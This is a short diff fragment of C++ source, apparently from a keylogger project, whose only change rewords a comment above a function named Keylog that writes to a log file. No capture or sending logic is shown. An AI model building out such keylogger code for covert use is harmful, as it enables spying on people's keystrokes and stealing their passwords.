@@ -32,7 +32,7 @@ int main()
 	return 0;
 }
 
-// The actual running keylogger function
+// The actual running keylogger procedure
 void Keylog(std::ofstream& logFile)
 {
 	bool wasKeyPreviouslyDown[256];
